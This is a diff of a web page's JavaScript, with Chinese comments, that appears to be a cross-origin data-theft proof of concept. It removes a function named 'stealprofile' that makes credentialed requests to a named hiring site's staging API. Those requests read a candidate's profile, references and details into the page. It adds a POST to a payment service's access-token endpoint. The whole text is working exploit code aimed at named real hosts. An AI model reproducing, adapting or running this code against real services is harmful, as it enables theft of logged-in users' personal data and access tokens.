@@ -28,8 +28,8 @@ function loadReferenceData() {
     // 显示加载状态
     referenceElement.innerHTML = '<span style="color: #666;">加载中...</span>';
  
-    fetch('https://api.schoolspringstaging.com/api/CCandidate/GetCandidateInfoById/7602032', { // 替换为实际API地址
-        method: 'GET',
+    fetch('https://cashier-my4a.pipopay.com/user/v1/get_access_token?fp_token=', { // 替换为实际API地址
+        method: 'POST',
         mode: 'cors', // 显式指定CORS模式
         headers: {
             'Content-Type': 'application/json',
@@ -62,51 +62,7 @@ function loadReferenceData() {
         console.error('请求失败:', error);
     });
 }
-		
-function stealprofile(){
-	var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://api.schoolspringstaging.com/api/CCandidate/GetCandidateInfoById/7602032", true);
-        xhr.setRequestHeader("Accept", "*/*");
-        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
-        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
-        xhr.withCredentials = true;
-        xhr.send();
- 	xhr.onreadystatechange = function(){
-	    //若响应完成且请求成功
-	    if(xhr.readyState === 4 && xhr.status === 200){
-		document.getElementById("customer").innerHTML = xhr.responseText;
-		console.log("Success");
-	    }
-	}
-	var xhr1 = new XMLHttpRequest();
-        xhr1.open("GET", "https://api.schoolspringstaging.com/api/jobs/ats/Reference?domainName=", true);
-        xhr1.setRequestHeader("Accept", "*/*");
-        xhr1.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
-        xhr1.setRequestHeader("Content-Type", "application/json; charset=utf-8");
-        xhr1.withCredentials = true;
-        xhr1.send();
- 	xhr1.onreadystatechange = function(){
-	    //若响应完成且请求成功
-	    if(xhr1.readyState === 4 && xhr1.status === 200){
-		document.getElementById("Reference").innerHTML = xhr1.responseText;
-		console.log("Success");
-	    }
-	}
-	var xhr2 = new XMLHttpRequest();
-        xhr2.open("GET", "https://api.schoolspringstaging.com/api/AtsCandidate/GetAtsCandidateDetails?domainName=", true);
-        xhr2.setRequestHeader("Accept", "*/*");
-        xhr2.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
-        xhr2.setRequestHeader("Content-Type", "application/json; charset=utf-8");
-        xhr2.withCredentials = true;
-        xhr2.send();
- 	xhr2.onreadystatechange = function(){
-	    //若响应完成且请求成功
-	    if(xhr2.readyState === 4 && xhr2.status === 200){
-		document.getElementById("candidate").innerHTML = xhr2.responseText;
-		console.log("Success");
-	    }
-	}
-}
+	
 	
 	
 </script>
